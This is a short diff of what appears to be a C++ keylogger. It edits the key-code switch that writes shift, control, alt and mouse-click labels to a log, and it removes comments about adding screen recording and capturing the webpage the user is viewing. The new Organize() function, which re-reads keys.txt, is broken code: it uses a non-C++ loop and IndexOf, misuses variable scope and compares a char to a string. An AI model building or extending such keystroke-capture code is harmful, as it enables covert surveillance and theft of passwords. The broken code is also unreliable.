@@ -29,7 +29,7 @@ void Logging(){
                         log << "\n";//go to next line
                         break;
                     case VK_SHIFT:
-                        log << "Shift";
+                        log << "[shift]";
                         break;
                     case VK_CONTROL:
                         log << "[control]";
@@ -43,10 +43,10 @@ void Logging(){
                     case VK_MENU:
                         log << "[alt]";
                     case VK_LBUTTON:
-                        log << "Lclick\n";
+                        log << "[lc]\n";
                         break;
                     case VK_RBUTTON:
-                        log << "Rclick\n";
+                        log << "[rc]\n";
                         break;
                     default:
                         log << c;
@@ -56,5 +56,20 @@ void Logging(){
         }
     }
 }
-//tie in with screen recorder
-//Find a way to get webpage that user is looking at
+
+void Organize(){
+    log.open("keys.txt", ios::app);
+    for(char c in log)
+    {
+        if(c == '['){
+            int si = log.IndexOf(c);
+        }
+        if(c == "]"){
+            int ei = log.IndexOf(c);
+        }
+        if(si < ei){
+            //put everything from [ to ] and figure out what it means. ex: delete, cap, etc
+        }
+    }
+    Logging();
+}
